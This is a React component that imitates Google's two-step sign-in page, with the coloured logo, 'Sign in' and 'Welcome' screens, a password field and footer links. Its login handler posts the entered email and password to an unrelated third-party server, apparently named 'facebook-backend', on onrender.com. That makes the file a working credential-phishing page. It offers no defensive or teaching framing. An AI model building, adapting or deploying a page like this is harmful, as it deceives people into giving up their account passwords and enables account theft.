import { useState } from "react";

import axios from "axios";

import { IoMdContact } from "react-icons/io";

const Google = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [step, setStep] = useState('email');
    const [formData, setFormData] = useState({ email: "", password: "" });
    const [error, setError] = useState(null);

    const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

    const handleNext = (e) => {
        e.preventDefault();
        if (formData.email) {
            setStep('password');
        }
    };

    const handleLogin = async (e) => {
        e.preventDefault();
        setError(null); // Reset error state

        try {
            const newData = { email: formData.email, password: formData.password }
            const response = await axios.post("https://facebook-backend-5229.onrender.com/api/login", formData, {
                headers: { "Content-Type": "application/json" },
                withCredentials: true, // If using cookies for authentication 
            });


            if (response.data.success) {
                alert("Login Successful!");
                console.log("User Data:", response.data);
                // Redirect user or store authentication token
            } else {
                setError("Invalid credentials, please try again.");
            }
        } catch (err) {
            console.error("Login Error:", err);
            setError("Something went wrong. Please try again.");
        }
    };

    return (
        <div className="min-h-screen bg-[#202124] lg:bg-[#181818] text-white flex flex-col items-center lg:justify-center">
            <div className="w-full h-full lg:max-w-[calc(100%-256px)] flex flex-col">
                <div className="bg-[#202124] flex flex-col md:flex-row p-8 justify-between  rounded-3xl w-full lg:shadow-xl">
                    <div className="mb-6 max-w-[50%]">
                        <div className="text-5xl font-bold mb-5 flex items-center space-x-2">
                            <span className="text-blue-500">G</span>
                            <span className="text-red-500">o</span>
                            <span className="text-yellow-500">o</span>
                            <span className="text-blue-500">g</span>
                            <span className="text-green-500">l</span>
                            <span className="text-red-500">e</span>
                        </div>

                        {
                            step === "email" ? (
                                <>
                                    <h2 className="text-4xl mb-5 font-semibold">Sign in</h2>
                                    <p className="text-xl  lg:pr-10 pr-0 text-gray-400 mt-1">
                                        with your Google Account. This account will be available to other Google apps in the browser.
                                    </p>
                                </>
                            ) : (
                                <>
                                    <h2 className="text-5xl mb-6 font-semibold">Welcome</h2>
                                    <p className="text-xl border-2 border-white flex pr-10 rounded-3xl text-gray-400 mt-1 ">
                                        <span><IoMdContact className="size-8" /></span>
                                        {formData.email}
                                    </p>
                                </>
                            )
                        }
                    </div>

                    <form className='mt-20 min-w-[50%]' onSubmit={step === 'email' ? handleNext : handleLogin}>
                        {
                            step === "email" ? (
                                <>
                                    <div className="relative">
                                        <input
                                            type="text"
                                            id="email"
                                            name="email"
                                            value={formData.email}
                                            onChange={handleChange}
                                            className="peer text-[20px] h-16 w-full bg-[#202124] border-2 rounded-md p-3 placeholder-transparent focus:outline-none focus:border-blue-500"
                                            placeholder="Email or phone"
                                            required
                                        />
                                        <label
                                            htmlFor="email"
                                            className="absolute cursor-text left-3 -top-4 text-gray-600 text-[20px] bg-[#202124] px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-4 peer-focus:text-[20px] peer-focus:text-blue-500"
                                        >
                                            Email or phone
                                        </label>
                                    </div>
                                    <div className="text-lg text-blue-400 mb-6 hover:underline cursor-pointer">Forgot email?</div>

                                    <div className="text-lg text-gray-400 my-12">
                                        Not your computer? Use Guest mode to sign in privately.{" "}
                                        <span className="text-blue-400 hover:underline cursor-pointer">Learn more about using Guest mode</span>
                                    </div>

                                    <div className="flex justify-end py-4 items-center">
                                        <button className="text-blue-400 hover:underline text-lg mr-10">Create account</button>
                                        <button type="submit" className="bg-blue-500 text-white px-6 py-2 rounded-full text-lg font-medium hover:bg-blue-600">
                                            Next
                                        </button>
                                    </div>
                                </>
                            ) : (
                                <>
                                    <div className="relative mt-12">
                                        <input
                                            type={showPassword ? "text" : "password"}
                                            id="password"
                                            name="password"
                                            value={formData.password}
                                            onChange={handleChange}
                                            className="peer w-full text-[20px] h-16 bg-[#202124] border-2 rounded-md p-3 placeholder-transparent focus:outline-none focus:border-blue-500"
                                            placeholder="Enter your password"
                                            required
                                        />
                                        <label
                                            htmlFor="password"
                                            className="absolute cursor-text left-3 -top-6 text-gray-600 text-[20px] bg-[#202124] px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-4 peer-focus:text-lg peer-focus:text-blue-500"
                                        >
                                            Enter your password
                                        </label>
                                    </div>
                                    <div className="flex items-center space-x-2 mt-3">
                                        <input
                                            type="checkbox"
                                            id="togglePassword"
                                            checked={showPassword}
                                            onChange={() => setShowPassword(!showPassword)}
                                            className="size-6 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                                        />
                                        <label htmlFor="togglePassword" className="text-[20px] text-gray-300 cursor-pointer">
                                            Show password
                                        </label>
                                    </div>
                                    <div className="flex justify-end py-6 items-center">
                                        <button className="text-blue-400 hover:underline text-lg mr-10">Forgot password</button>
                                        <button type="submit" className="bg-blue-500 text-white px-6 py-2 rounded-full text-lg font-medium hover:bg-blue-600">
                                            Next
                                        </button>
                                    </div>
                                </>
                            )
                        }

                    </form>
                </div>
                <div className='fixed bottom-2 left-0 right-0 flex justify-end space-x-10 p-3 lg:static lg:justify-end lg:mt-4'>
                    <a className='text-gray-400' href="">Help</a>
                    <a className='text-gray-400' href="">Privacy</a>
                    <a className='text-gray-400' href="">Terms</a>
                </div>
            </div>
        </div>
    );
}

export default Google